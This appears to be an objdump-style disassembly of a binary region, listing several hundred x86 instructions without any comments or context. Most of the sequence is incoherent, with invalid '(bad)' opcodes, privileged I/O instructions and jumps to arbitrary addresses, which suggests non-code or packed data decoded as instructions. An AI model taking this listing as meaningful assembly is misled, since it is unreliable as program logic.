  4218f9:	and    ebp,edx
  4218fb:	xchg   esi,eax
  4218fc:	aas    
  4218fd:	dec    esi
  4218fe:	inc    ebp
  4218ff:	dec    esi
  421900:	clc    
  421901:	add    DWORD PTR [edi+0x79],esi
  421904:	aad    0x80
  421906:	rcr    BYTE PTR [edi],cl
  421908:	dec    esp
  421909:	leave  
  42190a:	pop    ebp
  42190b:	push   eax
  42190c:	mov    eax,0xa4453f8d
  421911:	xor    DWORD PTR [ebx+0x5933d3e6],ecx
  421917:	dec    edx
  421918:	sub    ebx,DWORD PTR [eax]
  42191a:	es ins BYTE PTR es:[edi],dx
  42191c:	jo     0x4218c8
  42191e:	push   esp
  42191f:	xchg   ecx,eax
  421920:	pop    ss
  421921:	(bad)  
  421922:	enter  0xc275,0xc5
  421926:	mov    ah,0x45
  421928:	shl    BYTE PTR [ebp-0x2edb2806],cl
  42192e:	jo     0x421953
  421930:	xchg   edx,eax
  421931:	push   0xb218dc7e
  421936:	iret   
  421937:	sbb    al,0xda
  421939:	pop    ecx
  42193a:	fnsave ds:0xe17717a1
  421940:	and    DWORD PTR [esi],ebp
  421942:	test   al,0x8c
  421944:	mov    dh,0xdf
  421946:	repnz inc esi
  421948:	ins    BYTE PTR es:[edi],dx
  421949:	les    esi,FWORD PTR [ebx-0x3cd35f15]
  42194f:	ins    BYTE PTR es:[edi],dx
  421950:	or     esi,esp
  421952:	xchg   ebp,eax
  421953:	lock ficom DWORD PTR [edi]
  421956:	mov    cl,0xb3
  421958:	add    eax,DWORD PTR [edi-0x6f465c26]
  42195e:	bound  edx,QWORD PTR [esi-0x27]
  421961:	lock into 
  421963:	mov    esi,0x1521d53b
  421968:	cmp    DWORD PTR [ebp+0x28d70699],edi
  42196e:	arpl   WORD PTR [ecx-0x7a3e2124],ax
  421974:	push   ss
  421975:	dec    edi
  421976:	ins    BYTE PTR es:[edi],dx
  421977:	mov    eax,ds:0x2147ebc4
  42197c:	mov    esi,DWORD PTR [ebx-0x40]
  42197f:	and    BYTE PTR [ebp-0x6680bfa4],dh
  421985:	jmp    0xb24d2ed5
  42198a:	imul   edx,DWORD PTR [ebx+0x545e3762],0x32
  421991:	daa    
  421992:	jmp    0x4219a6
  421994:	or     eax,0x58fe1fdf
  421999:	test   eax,0x672f05d5
  42199e:	pop    edi
  42199f:	int    0x4c
  4219a1:	xchg   BYTE PTR [edx],bh
  4219a3:	or     BYTE PTR [edx-0x6f],bh
  4219a6:	jo     0x42197a
  4219a8:	fisttp DWORD PTR [eax]
  4219aa:	push   esi
  4219ab:	stos   BYTE PTR es:[edi],al
  4219ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4219ad:	repnz inc edi
  4219af:	daa    
  4219b0:	cmp    BYTE PTR [ebx+0x6f],al
  4219b3:	add    al,cl
  4219b5:	mov    ah,0x76
  4219b7:	sub    eax,0x16a35fa9
  4219bc:	mov    esp,DWORD PTR [eax+edx*1]
  4219bf:	jl     0x4219eb
  4219c1:	ficom  WORD PTR [ebx-0x377bcc12]
  4219c7:	(bad)  
  4219c8:	pop    ds
  4219c9:	or     al,0x13
  4219cb:	add    BYTE PTR [esi],ch
  4219cd:	add    cl,bh
  4219cf:	pushf  
  4219d0:	pop    edx
  4219d1:	pop    ss
  4219d2:	fisubr WORD PTR [esi]
  4219d4:	or     al,0xeb
  4219d6:	(bad)  
  4219d7:	out    0xca,eax
  4219d9:	into   
  4219da:	mov    dl,0x12
  4219dc:	xorps  xmm5,XMMWORD PTR [eax+0x50]
  4219e0:	add    dl,BYTE PTR [ecx+0x24]
  4219e3:	xor    dl,BYTE PTR [edi+0x3f]
  4219e6:	push   0x63
  4219e8:	out    dx,al
  4219e9:	or     DWORD PTR [ebx-0x3a],esp
  4219ec:	retf   
  4219ed:	dec    esi
  4219ee:	scas   al,BYTE PTR es:[edi]
  4219ef:	int3   
  4219f0:	mov    ebp,0x7ecc9ff5
  4219f5:	and    esi,DWORD PTR [ebx]
  4219f7:	(bad)  
  4219f8:	shr    BYTE PTR [ecx-0x5dc78b0],1
  4219fe:	xchg   edi,eax
  4219ff:	ss xor eax,0x9cb84fde
  421a05:	dec    ebx
  421a06:	shl    BYTE PTR [edx+0x7e],cl
  421a09:	pushf  
  421a0a:	loope  0x421a24
  421a0c:	lock pushf 
  421a0e:	add    ebx,0xffffffa5
  421a11:	test   eax,0x744c36bc
  421a16:	imul   edx,DWORD PTR ss:[eax-0x33],0xb1045ee9
  421a1e:	outs   dx,BYTE PTR ds:[esi]
  421a1f:	sub    eax,0x9858de70
  421a24:	pop    edx
  421a25:	cwde   
  421a26:	and    BYTE PTR [esi+0x53],al
  421a29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a2a:	pop    ss
  421a2b:	xor    dl,bl
  421a2d:	into   
  421a2e:	mov    ds:0xd37ebfef,al
  421a33:	sub    edi,DWORD PTR [esi]
  421a35:	out    0x3f,eax
  421a37:	jle    0x4219d0
  421a39:	pushf  
  421a3a:	rol    BYTE PTR [edi-0x5e],0x1
  421a3e:	add    al,ch
  421a40:	add    DWORD PTR [eax],eax
  421a42:	add    BYTE PTR [ebx],dh
  421a44:	ficom  WORD PTR [edi]
  421a46:	bnd call 0x5863683e
  421a4c:	in     eax,0xdc
  421a4e:	stc    
  421a4f:	push   ebp
  421a50:	outs   dx,DWORD PTR ds:[esi]
  421a51:	dec    esi
  421a52:	xor    esi,DWORD PTR [edi]
  421a54:	fucomip st,st(3)
  421a56:	fimul  WORD PTR [ebx+0x54]
  421a59:	test   eax,0x19ea3d81
  421a5e:	mov    edx,esp
  421a60:	jae    0x421ad7
  421a62:	jne    0x421abd
  421a64:	mov    bh,0x92
  421a66:	pop    ebx
  421a67:	in     eax,0xaa
  421a69:	add    al,0x8b
  421a6b:	mov    eax,ds:0xa789100b
  421a70:	fstp   QWORD PTR [ecx+0x13]
  421a73:	repz gs (bad) 
  421a76:	les    esp,FWORD PTR [edx-0x457eaba9]
  421a7c:	jne    0x421ad2
  421a7e:	and    DWORD PTR [ebp*2+0x37e16836],eax
  421a85:	push   ebx
  421a86:	ss pop edx
  421a88:	mov    WORD PTR [ecx-0x7],?
  421a8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a8c:	jb     0x421ab7
  421a8e:	xor    al,0x5c
  421a90:	sbb    BYTE PTR [esi+0x6a80db77],ch
  421a96:	sub    eax,0xfa8ef329
  421a9b:	xor    ebx,ebp
  421a9d:	(bad)  
  421a9e:	outs   dx,BYTE PTR ds:[esi]
  421a9f:	pop    edx
  421aa0:	outs   dx,BYTE PTR ds:[esi]
  421aa1:	retf   
  421aa2:	cmp    al,0x85
  421aa4:	imul   ebx,ecx,0x2b
  421aa7:	ror    BYTE PTR [ebx-0x7d],0x58
  421aab:	in     al,dx
  421aac:	popf   
  421aad:	(bad)  
  421aae:	fsub   DWORD PTR [esi+esi*8]
  421ab1:	xor    ebp,DWORD PTR ss:[edi-0x40d8ede4]
  421ab8:	dec    ecx
  421ab9:	aas    
  421aba:	(bad)  
  421abb:	pop    edx
  421abc:	push   ds
  421abd:	dec    ebx
  421abe:	pusha  
  421abf:	push   DWORD PTR [ebx+0x2c1591d4]
  421ac5:	sub    ax,0x1ccc
  421ac9:	retf   0x6a1a
  421acc:	add    BYTE PTR [esp+eiz*8+0x6d],bl
  421ad0:	test   al,0xb8
  421ad2:	stos   DWORD PTR es:[edi],eax
  421ad3:	mov    ds:0xf203b138,al
  421ad8:	or     al,0xce
  421ada:	adc    DWORD PTR [ecx-0xb],edi
  421add:	pop    edx
  421ade:	mov    ch,0x4d
  421ae0:	out    0xc9,al
  421ae2:	adc    dl,BYTE PTR [ebx-0x3b]
  421ae5:	fcomp  DWORD PTR [ebp+0x41]
  421ae8:	loop   0x421b28
  421aea:	cmp    DWORD PTR [eax-0x7f8daf23],edx
  421af0:	add    eax,0x3585a44c
  421af5:	mov    esp,0x515b0dd0
  421afa:	mov    eax,0x61a87dfb
  421aff:	pop    es
  421b00:	dec    esi
  421b01:	push   esi
  421b02:	call   0x15b1:0xe52a8494
  421b09:	inc    ebp
  421b0a:	push   ds
  421b0b:	xchg   esi,eax
  421b0c:	shr    DWORD PTR fs:[ebp+eiz*8+0x12698636],1
  421b14:	out    0xa7,eax
  421b16:	(bad)  
  421b18:	mov    edi,0x20fba643
  421b1d:	and    eax,0x45186112
  421b22:	js     0x421b5e
  421b24:	les    ebp,FWORD PTR [edi-0x3e]
  421b27:	xchg   ecx,eax
  421b28:	mov    esp,0x894b19e
  421b2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b2e:	loope  0x421b6a
  421b30:	xchg   ecx,eax
  421b31:	push   0x36f3fda
  421b36:	pop    eax
  421b37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b38:	mov    ebx,0xa13879dc
  421b3d:	ficom  WORD PTR [eax]
  421b3f:	push   esp
  421b40:	adc    edi,ecx
  421b42:	add    eax,0xe900b4e8
  421b47:	xor    al,0x82
  421b49:	ror    DWORD PTR [ebx-0x2cc426de],1
  421b4f:	add    DWORD PTR [esi+0x3e],ebp
  421b52:	push   ecx
  421b53:	mov    DWORD PTR [ecx],ebp
  421b55:	inc    ebx
  421b56:	xor    eax,0x8420209f
  421b5b:	ds sub al,0x58
  421b5e:	sub    DWORD PTR [edx-0x6d],ebp
  421b61:	fwait
  421b62:	add    BYTE PTR [ebx-0x73],dh
  421b65:	inc    ebp
  421b66:	push   ebp
  421b67:	dec    eax
  421b68:	mov    DWORD PTR [ebx-0x2d3b25e6],esi
  421b6e:	test   BYTE PTR [edi-0x52],dl
  421b71:	jne    0x421b28
  421b73:	(bad)  
  421b75:	inc    esp
  421b76:	out    dx,al
  421b77:	xchg   BYTE PTR [ecx+0x3d],ch
  421b7a:	push   ecx
  421b7b:	xor    al,0x85
  421b7d:	and    eax,0x3f60f425
  421b82:	neg    bl
  421b84:	data16 daa 
  421b86:	pushf  
  421b87:	adc    BYTE PTR [edx+0x7e803493],dl
  421b8d:	leave  
  421b8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b8f:	icebp  
  421b90:	sub    al,0x8e
  421b92:	pop    esp
  421b93:	daa    
  421b94:	adc    eax,0xe1d32dc7
  421b99:	ror    DWORD PTR [ebx-0x2f],1
  421b9c:	dec    edi
  421b9d:	aas    
  421b9e:	fadd   DWORD PTR [ecx-0x58]
  421ba1:	jns    0x421c16
  421ba3:	ret    0xeb10
  421ba6:	out    0x98,eax
  421ba8:	pusha  
  421ba9:	mov    ecx,esi
  421bab:	pop    edi
  421bac:	inc    ebx
  421bad:	xor    al,0xa3
  421baf:	ficomp DWORD PTR [eax-0x3bf1c901]
  421bb5:	mov    eax,ds:0x58778c
  421bba:	xor    al,0x76
  421bbc:	add    BYTE PTR [eax+0x468458a3],0x9f
  421bc3:	xor    eax,0xb8dd82b2
  421bc8:	push   edi
  421bc9:	neg    BYTE PTR [ebp+0x6b4f6bc]
  421bcf:	pop    esp
  421bd0:	outs   dx,DWORD PTR ds:[esi]
  421bd1:	add    BYTE PTR [edx+0x76],0x47
  421bd5:	jno    0x421c27
  421bd7:	sahf   
  421bd8:	xor    BYTE PTR [ebp-0x3a7128bd],dh
  421bde:	push   eax
  421bdf:	sbb    eax,0xe11db663
  421be4:	lds    esp,FWORD PTR [edx-0xc951dac]
  421bea:	cld    
  421beb:	dec    ecx
  421bec:	push   0x6d
  421bee:	dec    edx
  421bef:	cmp    bh,BYTE PTR [ecx-0x2bcd594a]
  421bf5:	mov    BYTE PTR [ecx+0x49],cl
  421bf8:	dec    ecx
  421bf9:	repz push ds
  421bfb:	dec    ebp
  421bfc:	sar    edi,cl
  421bfe:	popf   
  421bff:	add    dh,cl
  421c01:	sub    edx,DWORD PTR [ecx+0x7d4d86ab]
  421c07:	leave  
  421c08:	lds    edi,FWORD PTR [ebx+0x1cda4280]
  421c0e:	call   edx
  421c10:	sub    DWORD PTR [bp+si+0x18],ebp
  421c14:	psllw  mm3,QWORD PTR [edx-0x32]
  421c18:	ret    0xfbdf
  421c1b:	mov    ah,0x3e
  421c1d:	or     bh,BYTE PTR [edi+0x1dad2a48]
  421c23:	lahf   
  421c24:	xchg   ecx,eax
  421c25:	cwde   
  421c26:	inc    edi
  421c27:	and    eax,0xdb4b27a4
  421c2c:	in     eax,dx
  421c2d:	outs   dx,BYTE PTR ds:[esi]
  421c2e:	and    bh,BYTE PTR [esi-0x5d]
  421c31:	(bad)  
  421c33:	pop    esi
  421c34:	(bad)  
  421c35:	mov    DWORD PTR [ebp-0x4b544cdb],ecx
  421c3b:	das    
  421c3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c3d:	add    DWORD PTR [eax],eax
  421c3f:	call   0xff421c45
  421c44:	test   DWORD PTR [esi],0x2f7a6461
  421c4a:	push   0x3f916442
  421c4f:	jl     0x421bd2
  421c51:	and    BYTE PTR [esi],cl
  421c53:	sbb    eax,DWORD PTR [edx+0x1e]
  421c56:	dec    ecx
  421c57:	or     eax,0x6118a9a8
  421c5c:	xchg   esi,eax
  421c5d:	imul   esp,DWORD PTR [ebx+0x40f49327],0xaa4d7bdd
  421c67:	xchg   BYTE PTR [edx+0x53],dl
  421c6a:	xor    eax,0x226c96d1
  421c6f:	fwait
  421c70:	mov    dl,0x66
  421c72:	test   ah,0x3e
  421c75:	fsubr  st,st(0)
  421c77:	mov    dl,0x31
  421c79:	jnp    0x421c2e
  421c7b:	call   0xc87e743c
  421c80:	rol    eax,1
  421c82:	dec    edi
  421c83:	sar    DWORD PTR [eax],cl
  421c85:	inc    edi
  421c86:	mov    al,0x10
  421c88:	fsub   DWORD PTR [esi+0x38]
  421c8b:	enter  0xedc,0x8c
  421c8f:	or     al,0x1
  421c91:	(bad)  
  421c92:	mov    ch,0x88
  421c94:	jl     0x421c92
  421c96:	sub    edx,DWORD PTR [ebp+0x53]
  421c99:	and    eax,0x901febf2
  421c9e:	jae    0x421c7c
  421ca0:	fisttp WORD PTR [ebx-0x2d]
  421ca3:	imul   ebx,DWORD PTR [esi],0x37
  421ca6:	(bad)  
  421ca8:	cmp    bh,BYTE PTR [edx-0x5a9a909b]
  421cae:	loope  0x421cf2
  421cb0:	xor    esp,ebp
  421cb2:	hlt    
  421cb3:	fincstp 
  421cb5:	lods   eax,DWORD PTR ds:[esi]
  421cb6:	scas   al,BYTE PTR es:[edi]
  421cb7:	jle    0x421c84
  421cb9:	sar    DWORD PTR [ebx+eax*2-0x3a],cl
  421cbd:	dec    esp
  421cbe:	or     DWORD PTR [edi+0x35e83585],esi
  421cc4:	retf   
  421cc5:	lods   eax,DWORD PTR ds:[esi]
  421cc6:	push   0x59
  421cc8:	add    eax,0x4ff3de69
  421ccd:	aam    0x2f
  421ccf:	nop
  421cd0:	sbb    esp,DWORD PTR [ebp-0x9f875f9]
  421cd6:	xchg   DWORD PTR [ecx+0x5495918e],edx
  421cdc:	jns    0x421c9c
  421cde:	les    esp,FWORD PTR [edi+ecx*4-0x3b]
  421ce2:	bound  edi,QWORD PTR ds:0x4b50a1c1
  421ce8:	push   0x3b313bd9
  421ced:	je     0x421d40
  421cef:	adc    ch,BYTE PTR [ebp+esi*8+0xe2e301f]
  421cf6:	or     bh,BYTE PTR [edx-0x4b]
  421cf9:	sbb    ebp,edx
  421cfb:	dec    edi
  421cfc:	xchg   ecx,eax
  421cfd:	jb     0x421d55
  421cff:	dec    edx
  421d00:	fstp   QWORD PTR ds:0xfe5154ae
  421d06:	(bad)  
  421d07:	out    dx,al
  421d08:	rcl    DWORD PTR cs:[edx-0x5b],1
  421d0c:	daa    
  421d0d:	sbb    BYTE PTR [ebp+0x571a3bd8],ch
  421d13:	inc    ebp
  421d14:	pop    edi
  421d15:	retf   0xaa76
  421d18:	push   ecx
  421d19:	in     eax,0x8d
  421d1b:	mov    ds,eax
  421d1d:	xchg   DWORD PTR [ebx],esp
  421d1f:	jnp    0x421ccb
  421d21:	sbb    eax,0xfffffff8
  421d24:	enter  0x6735,0xee
  421d28:	(bad)  
  421d29:	cli    
  421d2a:	mov    esp,0x1f0d71e9
  421d2f:	js     0x421cc8
  421d31:	data16 es (bad) 
  421d35:	fimul  WORD PTR ds:0xbca70882
  421d3b:	pop    esi
  421d3c:	rcr    BYTE PTR [ecx+0x6a],1
  421d3f:	jl     0x421d4c
  421d41:	je     0x421db0
  421d43:	or     ecx,ecx
  421d45:	lds    ebp,FWORD PTR [edi-0x26c19e88]
  421d4b:	jg     0x421db6
  421d4d:	or     edi,ebx
  421d4f:	push   0xffffff89
  421d51:	sbb    edx,edi
  421d53:	xchg   DWORD PTR [eax],esp
  421d55:	sbb    eax,0x247f8b0b
  421d5a:	mov    ebx,0x5fb42577
  421d5f:	dec    ebp
  421d60:	xor    edi,DWORD PTR [edi]
  421d62:	arpl   WORD PTR [ebx-0x4538a5f1],sp
  421d68:	add    eax,0x4cc3ffd0
  421d6d:	aas    
  421d6e:	test   eax,0x9ff44131
  421d73:	push   ebx
  421d74:	sbb    al,0x21
  421d76:	jp     0x421d52
  421d78:	repnz scas eax,DWORD PTR es:[edi]
  421d7a:	sub    eax,0x1340f9aa
  421d7f:	cli    
  421d80:	and    edi,DWORD PTR [ebp+0x51]
  421d83:	and    edi,ebp
  421d85:	adc    al,0x6d
  421d87:	pop    eax
  421d88:	inc    ebp
  421d89:	lock aas 
  421d8b:	rol    BYTE PTR [edx],cl
  421d8d:	int    0x3d
  421d8f:	xor    ch,BYTE PTR [edx]
  421d91:	int3   
  421d92:	pusha  
  421d93:	cmp    esi,DWORD PTR cs:[ebx+0x67e0b7d2]
  421d9a:	add    BYTE PTR [esi-0x70],bh
  421d9d:	adc    ecx,ebp
  421d9f:	out    0xf2,al
  421da1:	mov    ah,0xe8
  421da3:	sub    al,0x3e
  421da5:	sbb    ecx,edi
  421da7:	jbe    0x421d89
  421da9:	push   eax
  421daa:	dec    ecx
  421dab:	aad    0x26
  421dad:	fadd   QWORD PTR [esi]
  421daf:	into   
  421db0:	arpl   WORD PTR [ecx-0x2b],cx
  421db3:	repz fld QWORD PTR [edx]
  421db6:	dec    ebp
  421db7:	test   BYTE PTR [ebp+edi*2+0x65],al
  421dbb:	repnz push edx
  421dbd:	and    ah,ch
  421dbf:	jp     0x421db4
  421dc1:	or     dh,cl
  421dc3:	push   ebx
  421dc4:	xchg   edx,eax
  421dc5:	jae    0x421e0a
  421dc7:	jl     0x421e16
  421dc9:	stos   BYTE PTR es:[edi],al
  421dca:	add    dl,BYTE PTR [edi+0x18]
  421dcd:	int    0xa
  421dcf:	lea    ecx,[edi]
  421dd1:	mov    WORD PTR [ebp+0x3],es
  421dd4:	sbb    edi,DWORD PTR [eax+0x34a643be]
  421dda:	xchg   ebp,eax
  421ddb:	sbb    DWORD PTR [edi],ebx
  421ddd:	mov    edx,0xe88826ad
  421de2:	out    dx,al
  421de3:	into   
  421de4:	ficomp WORD PTR [eax]
  421de6:	inc    esp
  421de7:	mov    cl,BYTE PTR [ecx+0x47d8aa83]
  421ded:	dec    eax
  421dee:	ret    0x684d
  421df1:	inc    edx
  421df2:	pop    ecx
  421df3:	push   edi
  421df4:	push   0x55ad975e
  421df9:	sub    edx,DWORD PTR [eax]
  421dfb:	fsubr  DWORD PTR [eax]
  421dfd:	pop    esi
  421dfe:	push   ds
  421dff:	test   eax,0x49d6fbfd
  421e04:	cmp    BYTE PTR [edi],0x1a
  421e07:	int3   
  421e08:	mov    eax,ds:0x8108b17b
  421e0d:	fdiv   DWORD PTR [esp+eiz*2]
  421e10:	pop    ebp
  421e11:	int3   
  421e12:	iret   
  421e13:	mov    cl,0x8b
  421e15:	fldenv [edx+0x302eb0f0]
  421e1b:	sbb    al,0x2a
  421e1d:	das    
  421e1e:	dec    eax
  421e1f:	dec    edi
  421e20:	shl    DWORD PTR [ecx+ebp*4-0x6365aabd],cl
  421e27:	cmp    BYTE PTR [edi+0x220515db],dh
  421e2d:	imul   edx,DWORD PTR [edi-0x4d022091],0x66
  421e34:	and    BYTE PTR [esi+0x1b06316a],ah
  421e3a:	test   BYTE PTR [edi],dl
  421e3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e3d:	add    DWORD PTR [eax],eax
  421e3f:	call   0xe0421e45
  421e44:	add    DWORD PTR [ebp+eiz*8+0x2ae0f922],0x29821a52
  421e4f:	shl    DWORD PTR [edi],1
  421e51:	fucom  st(6)
  421e53:	pop    esp
  421e54:	bound  edi,QWORD PTR [esi+0x198eb137]
  421e5a:	mov    bh,0x4a
  421e5c:	mov    WORD PTR [ebx+0x2ff42b6c],?
  421e62:	inc    ebp
  421e63:	push   cs
  421e64:	xor    edi,DWORD PTR [ecx]
  421e66:	sti    
  421e67:	push   esi
  421e68:	mov    edx,DWORD PTR [eax-0x5d]
  421e6b:	or     BYTE PTR [edi],dh
  421e6d:	test   DWORD PTR [esi+0x72f1f43d],ebx
  421e73:	adc    al,0xa8
  421e75:	mov    ah,0x61
  421e77:	in     al,dx
  421e78:	adc    ecx,DWORD PTR [eax]
  421e7a:	mov    ch,0x6
  421e7c:	(bad)  
  421e7d:	fdiv   QWORD PTR [esi+edx*8]
  421e80:	xchg   edi,eax
  421e81:	(bad)  
  421e82:	pop    eax
  421e83:	inc    esp
  421e84:	xchg   DWORD PTR [edi-0x44c3462a],ebx
  421e8a:	push   edi
  421e8b:	jl     0x421e8e
  421e8d:	jb     0x421e7e
  421e8f:	addr16 mov ?,edi
  421e92:	mov    ah,BYTE PTR ds:0xd4c55af3
  421e98:	add    DWORD PTR gs:[eax-0x28],edx
  421e9c:	jle    0x421ed4
  421e9e:	pop    esp
  421e9f:	push   ds
  421ea0:	out    0x2f,eax
  421ea2:	inc    esp
  421ea3:	popf   
  421ea4:	jg     0x421eee
  421ea6:	push   eax
  421ea7:	lea    esp,[edi-0x27]
  421eaa:	mov    esi,0x74f41682
  421eaf:	imul   eax,esi,0x24
  421eb2:	sub    edx,DWORD PTR [edx]
  421eb4:	dec    ecx
  421eb5:	adc    dh,BYTE PTR [eax]
  421eb7:	push   cs
  421eb8:	test   al,0x8b
  421eba:	popa   
  421ebb:	out    0x24,al
  421ebd:	xchg   BYTE PTR [ebx-0xa],dl
  421ec0:	in     al,dx
  421ec1:	add    BYTE PTR [esi-0x32],ch
  421ec4:	hlt    
  421ec5:	mov    esp,0xe62f76ad
  421eca:	cmp    al,0x34
  421ecc:	mov    al,0xc4
  421ece:	in     al,dx
  421ecf:	call   0xd2c3:0xdbffeb5d
  421ed6:	dec    edx
  421ed7:	jle    0x421ef7
  421ed9:	or     eax,0xf68b4bef
  421ede:	mov    ecx,DWORD PTR [ebx]
  421ee0:	std    
  421ee1:	neg    BYTE PTR [ebx+ebp*2-0x5f04f013]
  421ee8:	jge    0x421f60
  421eea:	(bad)  [edi-0x8]
  421eed:	sbb    BYTE PTR [esi],dh
  421eef:	mov    ebx,0xa88c31b1
  421ef4:	ds icebp 
  421ef6:	ret    0x5a84
  421ef9:	lahf   
  421efa:	into   
  421efb:	and    ch,BYTE PTR [ebp+0x57655651]
  421f01:	jb     0x421ec0
  421f03:	adc    al,BYTE PTR [ecx+0x59]
  421f06:	mov    ebx,0xcbe50a69
  421f0b:	pop    ss
  421f0c:	in     al,dx
  421f0d:	push   esi
  421f0e:	int    0xb4
  421f10:	add    eax,DWORD PTR [edx]
  421f12:	not    BYTE PTR [edx+0x509a8ab3]
  421f18:	pop    esp
  421f19:	popa   
  421f1a:	das    
  421f1b:	jmp    0x421f77
  421f1d:	sub    BYTE PTR ds:0x8513cf60,al
  421f23:	pop    ebx
  421f24:	and    eax,0xf11ca79
  421f29:	pop    ebp
  421f2a:	cmp    BYTE PTR [esi],bl
  421f2c:	mov    edi,0xf084ac38
  421f31:	inc    esi
  421f32:	mov    ch,0x91
  421f34:	jl     0x421f61
  421f36:	xchg   edi,eax
  421f37:	out    0x24,eax
  421f39:	sub    cl,BYTE PTR [eax+0x22]
  421f3c:	jge    0x421f1f
  421f3e:	cmp    edx,DWORD PTR [edx-0x83bcb09]
  421f44:	in     al,dx
  421f45:	fcom   DWORD PTR [edx]
  421f47:	test   al,0x32
  421f49:	mov    edx,DWORD PTR [esi-0x672b3204]
  421f4f:	loope  0x421fce
  421f51:	jmp    0x590e821d
  421f56:	mov    eax,0x176e15c2
  421f5b:	pop    edi
  421f5c:	mov    edi,0xc8d0a275
  421f61:	inc    eax
  421f62:	sub    al,0xdb
  421f64:	pop    esi
  421f65:	test   al,0x74
  421f67:	push   DWORD PTR [ecx]
  421f69:	mov    al,0x1b
  421f6b:	repnz leave 
  421f6d:	pop    es
  421f6e:	xor    ebp,edx
  421f70:	(bad)
  421f74:	scas   al,BYTE PTR es:[edi]
  421f75:	push   ebp
  421f76:	mov    ?,WORD PTR [edi-0x9480f6c]
  421f7c:	add    bh,dl
  421f7e:	dec    ebx
  421f7f:	jbe    0x421fcc
  421f81:	add    DWORD PTR [esi+0x12],eax
  421f84:	push   eax
  421f85:	pop    edi
  421f86:	scas   al,BYTE PTR es:[edi]
  421f87:	in     al,dx
  421f88:	mov    bh,0x11
  421f8a:	or     BYTE PTR [ebp+0x41],cl
  421f8d:	sbb    ebp,0x9b14953f
  421f93:	pop    edx
  421f94:	xor    eax,DWORD PTR [eax-0xfc3e846]
  421f9a:	mov    ecx,0x905d8ad1
  421f9f:	cmp    al,0xa2
  421fa1:	pop    ebx
  421fa2:	fwait
  421fa3:	popa   
  421fa4:	jle    0x421f2f
  421fa6:	add    al,0xbb
  421fa8:	mov    edi,edi
  421faa:	fcomp  QWORD PTR [ecx]
  421fac:	loope  0x421fbb
  421fae:	dec    edi
  421faf:	jmp    0x421f8a
  421fb1:	clc    
  421fb2:	stc    
  421fb3:	mov    dl,0xb1
  421fb5:	cmc    
  421fb6:	sbb    eax,0x4c71b172
  421fbb:	lds    ecx,FWORD PTR [ecx-0x776232a2]
  421fc1:	in     al,dx
  421fc2:	pop    ds
  421fc3:	mov    bh,0x3d
  421fc5:	scas   eax,DWORD PTR es:[edi]
  421fc6:	in     eax,0xd0
  421fc8:	mov    dl,ah
  421fca:	adc    BYTE PTR [ebp+0x1c61ac6d],bl
  421fd0:	jne    0x421f56
  421fd2:	int3   
  421fd3:	add    al,0xc1
  421fd5:	sahf   
  421fd6:	xchg   esi,eax
  421fd7:	lahf   
  421fd8:	cmp    al,BYTE PTR [edx+0x19e15da9]
  421fde:	out    0x82,al
  421fe0:	sbb    eax,0x5eb5705f
  421fe5:	jmp    0xdce9e879
  421fea:	in     al,0x76
  421fec:	aad    0xc7
  421fee:	pop    es
  421fef:	mov    cl,BYTE PTR [edi-0x36]
  421ff2:	jb     0x422016
  421ff4:	sub    eax,esp
  421ff6:	mov    ch,0x93
  421ff8:	add    BYTE PTR [ecx+0x68],ah
  421ffb:	or     al,0xb5
  421ffd:	or     BYTE PTR [ebx-0x7c6e5240],0xd2
  422004:	xor    DWORD PTR [esi+edx*4+0x43],0xa370e415
  42200c:	or     eax,0x7a3f38f7
  422011:	adc    esp,DWORD PTR [eax+0x1338b8a2]
  422017:	fcmovne st,st(2)
  422019:	adc    ebx,DWORD PTR [edi+ebx*2+0x77]
  42201d:	xchg   BYTE PTR [ebp+0xc],dl
  422020:	mov    al,ds:0xbe9e3251
  422025:	push   edi
  422026:	sub    ebp,0xffffff84
  422029:	pop    DWORD PTR [edx-0x26db2b75]
  42202f:	jg     0x42202a
  422031:	call   esi
  422033:	into   
  422034:	inc    ebp
  422035:	mov    bh,0x11
  422037:	les    ecx,FWORD PTR [ebx-0x58003996]
  42203d:	add    DWORD PTR [eax],eax
  42203f:	call   0x79422045
  422044:	into   
  422045:	icebp  
  422046:	shr    BYTE PTR [edi-0x42],1
  422049:	push   ebp
  42204a:	inc    edi
  42204b:	adc    eax,0xad757a23
  422050:	sub    eax,0x94351e79
  422055:	repnz xchg esi,eax
  422057:	or     eax,0xf05493b8
  42205c:	addr16 mov cl,0x70
  42205f:	xor    ebx,DWORD PTR [ecx+0x6bbcb54e]
  422065:	neg    bh
  422067:	in     eax,0x4f
  422069:	cdq    
  42206a:	sbb    eax,0x4e002ea7
  42206f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422070:	add    DWORD PTR [bp+si-0x51cc],0xe
  422076:	or     eax,0x89323761
  42207b:	pop    edi
  42207c:	xor    al,0xf3
  42207e:	jb     0x4220d5
  422080:	cwde   
  422081:	jne    0x4220c3
  422083:	cli    
  422084:	imul   esp,DWORD PTR [edi+eiz*2+0x7f71b059],0x2c
  42208c:	mov    eax,ds:0x6c9bfea8
  422091:	aam    0x27
  422093:	clc    
  422094:	mov    WORD PTR [ebp-0x7f],?
  422097:	popa   
  422098:	cdq    
  422099:	(bad)  
  42209b:	fcom   QWORD PTR [ecx]
  42209d:	sti    
  42209e:	add    esp,DWORD PTR [ebp+0x67ef386b]
  4220a4:	xor    ch,bl
  4220a6:	mov    cl,0xaa
  4220a8:	sbb    eax,0x8688788d
  4220ad:	and    edx,ecx
  4220af:	rcl    DWORD PTR [edi],1
  4220b1:	outs   dx,DWORD PTR ds:[esi]
  4220b2:	jo     0x42204c
  4220b4:	scas   eax,DWORD PTR es:[edi]
  4220b5:	push   edi
  4220b6:	pusha  
  4220b7:	mov    ebx,0x7fd9cb4e
  4220bc:	adc    al,0xd8
  4220be:	pop    edi
  4220bf:	into   
  4220c0:	mov    cl,0x43
  4220c2:	jbe    0x422090
  4220c4:	popa   
  4220c5:	adc    eax,0x7fe7534c
  4220ca:	fistp  WORD PTR [esi]
  4220cc:	xor    bh,BYTE PTR [edi-0x59]
  4220cf:	cmp    al,0xbf
  4220d1:	fbstp  TBYTE PTR [esi-0x67]
